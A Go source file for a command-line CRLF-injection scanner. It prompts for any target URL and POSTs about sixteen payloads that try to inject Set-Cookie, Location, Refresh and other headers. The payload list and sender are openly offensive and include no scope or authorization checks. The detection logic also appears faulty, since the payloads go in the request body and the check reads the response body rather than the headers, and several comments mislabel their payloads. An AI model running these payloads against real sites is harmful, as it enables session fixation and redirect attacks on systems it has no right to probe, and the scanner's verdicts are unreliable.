package main

import (
    "bufio"
    "fmt"
    "net/http"
    "os"
    "strings"
)

func main() {
    // Prompt for the target URL
    fmt.Print("Enter your target URL: ")
    reader := bufio.NewReader(os.Stdin)
    targetURL, _ := reader.ReadString('\n')
    targetURL = strings.TrimSpace(targetURL)

    // Craft payloads with various CRLF injection techniques
    payloads := []string{
        // CRLF injection in Set-Cookie header
        "username=test%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A&password=test",

        // CRLF injection in Content-Length header
        "username=test%0D%0AContent-Length:%200%0D%0A&password=test",

        // CRLF injection in Refresh header
        "username=test%0D%0ARefresh:%200%0D%0A&password=test",

        // CRLF injection in Location header
        "username=test%0D%0ALocation:%20https://www.bbc.com%0D%0A&password=test",

        // CRLF injection in User-Agent header
        "User-Agent:%20Malicious%0D%0Ausername=test&password=test",

        // CRLF injection in Referer header
        "Referer:%20https://www.bbc.com%0D%0Ausername=test&password=test",

        // CRLF injection in Proxy header
        "Proxy:%20https://www.bbc.com%0D%0Ausername=test&password=test",

        // CRLF injection in Set-Cookie2 header
        "Set-Cookie2:%20maliciousCookie=maliciousValue%0D%0Ausername=test&password=test",

        // CRLF injection in any other custom header
        "CustomHeader:%20Injection%0D%0Ausername=test&password=test",

        // CRLF injection in HTTP request method
        "POST /login%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A HTTP/1.1%0D%0AHost: example.com%0D%0AContent-Length: 0%0D%0A%0D%0A",

        // CRLF injection in HTTP version
        "POST /login HTTP/1.1%0D%0AHost: example.com%0D%0AContent-Length: 0%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A%0D%0A",

        // CRLF injection in MIME types
        "Content-Type: text/html%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A%0D%0Ausername=test&password=test",

        // CRLF injection in HTML comment
        "<!--%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A-->",

        // CRLF injection in URL path
        "/login%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A HTTP/1.1%0D%0AHost: example.com%0D%0AContent-Length: 0%0D%0A%0D%0A",

        // CRLF injection in URL query parameter
        "username=test&password=test%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue",

        // CRLF injection in HTTP header folding
        "X-Forwarded-For: 1.1.1.1\r\nSet-Cookie: maliciousCookie=maliciousValue\r\n",

        // Add more payloads here
    }

    // Loop through payloads and test for vulnerabilities
    for _, payload := range payloads {
        testCRLFInjection(targetURL, payload)
    }
}

func testCRLFInjection(targetURL, payload string) {
    // Create HTTP client
    client := &http.Client{}

    // Create HTTP request with crafted payload
    req, err := http.NewRequest("POST", targetURL, strings.NewReader(payload))
    if err != nil {
        fmt.Printf("Error creating request: %v\n", err)
        return
    }

    // Send request
    resp, err := client.Do(req)
    if err != nil {
        fmt.Printf("Error sending request: %v\n", err)
        return
    }
    defer resp.Body.Close()

    // Check response for indications of CRLF injection vulnerability
    scanner := bufio.NewScanner(resp.Body)
    for scanner.Scan() {
        line := scanner.Text()
        if strings.Contains(line, "maliciousCookie=maliciousValue") ||
            strings.Contains(line, "Refresh: 0") ||
            strings.Contains(line, "Content-Length: 0") ||
            strings.Contains(line, "Location: https://www.bbc.com") {
            fmt.Printf("Vulnerable to CRLF Injection: %s\n", payload)
            return
        }
    }

    fmt.Printf("Not vulnerable to CRLF Injection: %s\n", payload)
}
